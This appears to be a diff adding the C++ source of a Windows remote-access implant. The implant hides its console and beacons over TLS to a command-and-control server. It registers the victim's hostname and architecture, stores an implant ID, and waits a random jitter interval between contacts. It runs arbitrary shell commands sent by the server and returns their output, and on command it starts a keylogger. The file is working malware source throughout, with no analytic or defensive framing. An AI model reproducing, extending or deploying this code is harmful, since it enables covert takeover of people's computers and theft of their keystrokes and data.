@@ -1,0 +1,444 @@
+#define SECURITY_WIN32
+
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <windows.h>
+#include <unistd.h>
+#include <algorithm> // for std::min
+#include <stdbool.h>
+#include <security.h>
+#include <time.h> 
+#include <schannel.h>
+#include <stdio.h>
+
+#include "./includes/cJSON/cJSON.h"
+#include "./includes/keylogger.h"
+#include "./includes/persistance.h"
+//#pragma comment(lib, "ws2_32.lib")
+//#pragma comment(lib, "Secur32.lib")
+
+using namespace std;
+
+#define file_path "Z:\\tmp\\id" // "\\windows\\Temp\\id"
+#define PORT 7777
+#define ADDR "127.0.0.1"
+#define BUFFER 4096
+#define BUFFER_SIZE 4096
+#define max_response 0x20000
+#define MAX_RESPONSE 0x20000
+
+SOCKET sock = INVALID_SOCKET;
+CredHandle hCred;
+CtxtHandle hCtxt;
+SecPkgContext_StreamSizes streamSizes;
+
+
+int schannel_recv(char *buffer, int buffer_len) {
+    char encrypted[4096];
+    SecBuffer secBuffers[4];
+    SecBufferDesc secBufferDesc;
+    SECURITY_STATUS status;
+
+    int bytesRead = recv(sock, encrypted, sizeof(encrypted), 0);
+    if (bytesRead <= 0) return -1;
+
+    secBuffers[0].BufferType = SECBUFFER_DATA;
+    secBuffers[0].pvBuffer = encrypted;
+    secBuffers[0].cbBuffer = bytesRead;
+    secBuffers[1].BufferType = SECBUFFER_EMPTY;
+    secBuffers[2].BufferType = SECBUFFER_EMPTY;
+    secBuffers[3].BufferType = SECBUFFER_EMPTY;
+
+    secBufferDesc.cBuffers = 4;
+    secBufferDesc.pBuffers = secBuffers;
+    secBufferDesc.ulVersion = SECBUFFER_VERSION;
+
+    status = DecryptMessage(&hCtxt, &secBufferDesc, 0, NULL);
+    if (status != SEC_E_OK) return -1;
+
+    for (int i = 0; i < 4; i++) {
+        if (secBuffers[i].BufferType == SECBUFFER_DATA) {
+            //memcpy(buffer, secBuffers[i].pvBuffer, min((size_t)buffer_len, secBuffers[i].cbBuffer));
+            // Change the min() call to explicitly cast both arguments to size_t
+            memcpy(buffer, secBuffers[i].pvBuffer, min(static_cast<size_t>(buffer_len), static_cast<size_t>(secBuffers[i].cbBuffer)));
+            return secBuffers[i].cbBuffer;
+        }
+    }
+
+    return -1;
+}
+
+int schannel_send(const char *data, int len) {
+    char *message = (char*)malloc(streamSizes.cbHeader + len + streamSizes.cbTrailer);
+    if (!message) return -1;
+
+    SecBuffer buffers[3];
+    SecBufferDesc desc;
+
+    memcpy(message + streamSizes.cbHeader, data, len);
+
+    buffers[0].pvBuffer = message;
+    buffers[0].cbBuffer = streamSizes.cbHeader;
+    buffers[0].BufferType = SECBUFFER_STREAM_HEADER;
+
+    buffers[1].pvBuffer = message + streamSizes.cbHeader;
+    buffers[1].cbBuffer = len;
+    buffers[1].BufferType = SECBUFFER_DATA;
+
+    buffers[2].pvBuffer = message + streamSizes.cbHeader + len;
+    buffers[2].cbBuffer = streamSizes.cbTrailer;
+    buffers[2].BufferType = SECBUFFER_STREAM_TRAILER;
+
+    desc.cBuffers = 3;
+    desc.pBuffers = buffers;
+    desc.ulVersion = SECBUFFER_VERSION;
+
+    SECURITY_STATUS status = EncryptMessage(&hCtxt, 0, &desc, 0);
+    if (status != SEC_E_OK) {
+        free(message);
+        return -1;
+    }
+
+    int totalSize = buffers[0].cbBuffer + buffers[1].cbBuffer + buffers[2].cbBuffer;
+    int sent = send(sock, message, totalSize, 0);
+    free(message);
+
+    return sent;
+}
+
+
+
+
+
+
+class Device {
+    public:
+    void hideConsole();
+    const char* get_Arch();
+};
+
+class Communicate_ {
+    private:
+    public:
+    int conn();
+    void reg(Device d);
+    void beacon(const char *id);
+    void session();
+    void upload();
+    void download();
+};
+
+void Device::hideConsole() {
+    HWND stealth;
+    AllocConsole();
+    stealth = FindWindowA("ConsoleWindowClass", NULL);
+    ShowWindow(stealth, 0);
+}
+
+
+const char* Device::get_Arch() {
+    SYSTEM_INFO sysInfo;
+    GetNativeSystemInfo(&sysInfo);
+    switch (sysInfo.wProcessorArchitecture) {
+        case PROCESSOR_ARCHITECTURE_AMD64: return "x64"; break;
+        case PROCESSOR_ARCHITECTURE_INTEL: return  "x86"; break;
+        case PROCESSOR_ARCHITECTURE_ARM64: return  "ARM64"; break;
+        default: return "unknown"; break;
+    }
+}
+
+
+int jitter() {
+    srand(time(0));  // Seed the random number generator
+
+    // Define the range (3 hours to 3 days in seconds)
+    const int MIN_SECONDS = 3 * 3600;   // 3 hours (3 * 60 * 60)
+    const int MAX_SECONDS = 3 * 86400;  // 3 days (3 * 24 * 60 * 60)
+
+    //return MIN_SECONDS + rand() % (MAX_SECONDS - MIN_SECONDS + 1);
+    return (rand() % 0xfff ) + 0xff;
+}
+
+
+int main() {
+    Communicate_ comm;
+    Device d;
+
+    d.hideConsole();
+    while (1) {
+        if (comm.conn() == -1) {
+            sleep(jitter()); // use random for 
+            continue;
+        }
+        int file = open(file_path, OFN_READONLY);
+        if (file == -1) {
+            //register
+            comm.reg(d);
+            sleep(jitter());
+            continue;
+        }
+
+        char id[BUFFER_SIZE];
+        read(file, id, sizeof(id));
+
+        // check if implant_id file exists
+        comm.beacon(id);
+        Sleep(jitter());
+    }
+    
+    return 0;
+
+
+
+    return 0;
+}
+
+int Communicate_::conn() {
+    WSADATA wsaData;
+    struct sockaddr_in serverAddress;
+    SECURITY_STATUS ss;
+    SCHANNEL_CRED schannel_cred = {0};
+    SecBufferDesc OutBufferDesc;
+    SecBuffer OutBuffers[1];
+    DWORD OutFlags;
+    TimeStamp tsExpiry;
+
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return -1;
+
+    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (sock == INVALID_SOCKET) {
+        WSACleanup();
+        return -1;
+    }
+
+    serverAddress.sin_family = AF_INET;
+    serverAddress.sin_port = htons(PORT);
+    serverAddress.sin_addr.s_addr = inet_addr(ADDR);
+
+start_connect:
+    if (connect(sock, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
+        Sleep(30);
+        goto start_connect;
+    }
+
+    schannel_cred.dwVersion = SCHANNEL_CRED_VERSION;
+    schannel_cred.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT;
+    schannel_cred.dwFlags = SCH_CRED_MANUAL_CRED_VALIDATION;
+
+    ss = AcquireCredentialsHandle(NULL, UNISP_NAME, SECPKG_CRED_OUTBOUND, NULL, &schannel_cred, NULL, NULL, &hCred, &tsExpiry);
+    if (ss != SEC_E_OK) {
+        closesocket(sock);
+        WSACleanup();
+        return -1;
+    }
+
+    OutBufferDesc.cBuffers = 1;
+    OutBufferDesc.pBuffers = OutBuffers;
+    OutBufferDesc.ulVersion = SECBUFFER_VERSION;
+    OutBuffers[0].BufferType = SECBUFFER_TOKEN;
+    OutBuffers[0].cbBuffer = 0;
+    OutBuffers[0].pvBuffer = NULL;
+
+    ss = InitializeSecurityContext(&hCred, NULL, (SEC_CHAR *)ADDR, ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY, 0, SECURITY_NATIVE_DREP, NULL, 0, &hCtxt, &OutBufferDesc, &OutFlags, &tsExpiry);
+    if (ss != SEC_E_OK && ss != SEC_I_CONTINUE_NEEDED) {
+        FreeCredentialsHandle(&hCred);
+        closesocket(sock);
+        WSACleanup();
+        return -1;
+    }
+
+    if (OutBufferDesc.cBuffers > 0 && OutBuffers[0].cbBuffer > 0) {
+        send(sock, (const char *)OutBuffers[0].pvBuffer, OutBuffers[0].cbBuffer, 0);
+        FreeContextBuffer(OutBuffers[0].pvBuffer);
+    }
+
+    do {
+        SecBuffer InBuffer[1];
+        SecBufferDesc InBufferDesc;
+
+        InBuffer[0].BufferType = SECBUFFER_TOKEN;
+        InBuffer[0].cbBuffer = 4096;
+        InBuffer[0].pvBuffer = malloc(4096);
+        if (!InBuffer[0].pvBuffer) return -1;
+
+        int bytesRead = recv(sock, (char *)InBuffer[0].pvBuffer, 4096, 0);
+        if (bytesRead <= 0) {
+            free(InBuffer[0].pvBuffer);
+            DeleteSecurityContext(&hCtxt);
+            FreeCredentialsHandle(&hCred);
+            closesocket(sock);
+            WSACleanup();
+            return -1;
+        }
+        InBuffer[0].cbBuffer = bytesRead;
+
+        InBufferDesc.cBuffers = 1;
+        InBufferDesc.pBuffers = InBuffer;
+        InBufferDesc.ulVersion = SECBUFFER_VERSION;
+
+        OutBufferDesc.cBuffers = 1;
+        OutBufferDesc.pBuffers = OutBuffers;
+        OutBufferDesc.ulVersion = SECBUFFER_VERSION;
+        OutBuffers[0].BufferType = SECBUFFER_TOKEN;
+        OutBuffers[0].cbBuffer = 0;
+        OutBuffers[0].pvBuffer = NULL;
+
+        ss = InitializeSecurityContext(&hCred, &hCtxt, (SEC_CHAR *)ADDR, ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY, 0, SECURITY_NATIVE_DREP, &InBufferDesc, 0, &hCtxt, &OutBufferDesc, &OutFlags, &tsExpiry);
+
+        free(InBuffer[0].pvBuffer);
+
+        if (OutBufferDesc.cBuffers > 0 && OutBuffers[0].cbBuffer > 0) {
+            send(sock, (const char *)OutBuffers[0].pvBuffer, OutBuffers[0].cbBuffer, 0);
+            FreeContextBuffer(OutBuffers[0].pvBuffer);
+        }
+
+    } while (ss == SEC_I_CONTINUE_NEEDED);
+
+    if (ss != SEC_E_OK) {
+        DeleteSecurityContext(&hCtxt);
+        FreeCredentialsHandle(&hCred);
+        closesocket(sock);
+        WSACleanup();
+        return -1;
+    }
+
+
+    QueryContextAttributes(&hCtxt, SECPKG_ATTR_STREAM_SIZES, &streamSizes);
+    return 0;
+}
+
+
+
+void Communicate_::beacon(const char *id) {
+    FILE *exec;
+    cJSON *re = cJSON_CreateObject();
+    char result[MAX_RESPONSE];
+    char command_with_redirect[BUFFER_SIZE + 10];
+
+    cJSON *bea = cJSON_CreateObject();
+    cJSON_AddStringToObject(bea, "mode", "beacon");
+    cJSON_AddStringToObject(bea, "implant_id", id);
+    char *data = cJSON_Print(bea);
+    //send(sock, data, strlen(data), 0);
+    schannel_send(data, strlen(data));
+    free(data);
+    cJSON_Delete(bea);
+
+    char buffer[BUFFER_SIZE];
+    //int bytes = //recv(sock, buffer, sizeof(buffer), 0);
+    //if (bytes <= 0) {
+    //    // err/
+    //}
+    schannel_recv(buffer, sizeof(buffer));
+
+    cJSON *reply = cJSON_Parse(buffer);
+    cJSON *mode = cJSON_GetObjectItem(reply, "mode");
+    if (strncmp(mode->valuestring, "none", 4) == 0) {
+        return;
+    }  
+
+    cJSON *task_id = cJSON_GetObjectItem(reply, "task_id");
+    cJSON *cmd = cJSON_GetObjectItem(reply, "command");
+    // if command = "upload [file path]" | upload file to agent
+    
+    if (strncmp(cmd->valuestring, "upload", 6) == 0) {
+        upload();
+    // if command = "download [file path]" | download file from agent
+    } else if (strncmp(cmd->valuestring, "download", 8) == 0) { 
+        download();
+    } else if (strncmp(cmd->valuestring, "keylogger", 9) == 0) {
+        
+        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)StartWindowsKeylogger, NULL, 0, NULL);
+        WaitForSingleObject(hThread, INFINITE);
+        CloseHandle(hThread);
+        strcpy(result, "Started keylogger Successfully");
+
+        cJSON_AddStringToObject(re, "mode", "result");
+        cJSON_AddStringToObject(re, "implant_id", id);
+        cJSON_AddNumberToObject(re, "task_id", task_id->valueint);
+        cJSON_AddStringToObject(re, "response", result);
+        char *result_ = cJSON_Print(re);
+        //send(sock, result_, strlen(result_), 0);
+        schannel_send(result_, strlen(result_));
+        cJSON_Delete(re);
+        free(result_);
+        return;
+    }   
+
+    memset(buffer, 0, sizeof(buffer));
+    snprintf(command_with_redirect, sizeof(command_with_redirect), "%s 2>&1", cmd->valuestring);
+
+    exec = _popen(command_with_redirect, "r");
+    if (!exec) {
+        strcpy(result, "Failed to execute command.\n");
+
+        goto SEND_RESULT;
+    }
+
+    while (fgets(buffer, sizeof(buffer), exec) != NULL) {
+        strcat(result, buffer);
+    }
+    // send result
+    SEND_RESULT:
+    cJSON_AddStringToObject(re, "mode", "result");
+    cJSON_AddStringToObject(re, "implant_id", id);
+    cJSON_AddNumberToObject(re, "task_id", task_id->valueint);
+    cJSON_AddStringToObject(re, "response", result);
+    char *result_ = cJSON_Print(re);
+    //send(sock, result_, strlen(result_), 0);
+    schannel_send(result_, strlen(result_));
+    fclose(exec);
+    
+    cJSON_Delete(re);
+    free(result_);
+}
+
+void Communicate_::reg(Device d) {
+    char hostname[BUFFER_SIZE];
+    char os[BUFFER_SIZE];
+
+    if (gethostname(hostname, sizeof(hostname)) != 0) snprintf(hostname, sizeof(hostname), "Unknown");
+    const char *arch = d.get_Arch(); 
+    snprintf(os,sizeof(os), "%s", "Windows");
+    cJSON *reg = cJSON_CreateObject();
+    cJSON_AddStringToObject(reg, "mode", "register");
+    cJSON_AddStringToObject(reg, "os", os);
+    cJSON_AddStringToObject(reg, "hostname", hostname);
+    cJSON_AddStringToObject(reg, "arch", arch);
+    char *data = cJSON_Print(reg);
+    //send(sock, data, strlen(data), 0);
+    schannel_send(data, strlen(data));
+    free(data);
+    cJSON_Delete(reg);
+
+    char buffer[BUFFER_SIZE];
+    //int bytes = recv(sock, buffer, sizeof(buffer), 0);
+    //if (bytes <= 0) {
+    //    // 
+    //}
+    schannel_recv(buffer, sizeof(buffer));
+    cJSON *reply = cJSON_Parse(buffer);
+    cJSON *id = cJSON_GetObjectItem(reply, "implant_id");
+
+    // store id in a file
+    // file path
+    STORE_ID:
+    FILE *f = fopen(file_path, "w");
+    if (!f) {
+        Sleep(jitter());
+        goto STORE_ID;
+    }
+
+    fprintf(f, id->valuestring);
+    //fwrite(id->valuestring, 1, sizeof(id->valuestring), f);
+    fclose(f);
+    cJSON_Delete(reply);
+}
+
+void Communicate_::upload() {
+
+}
+
+void Communicate_::download() {
+
+}
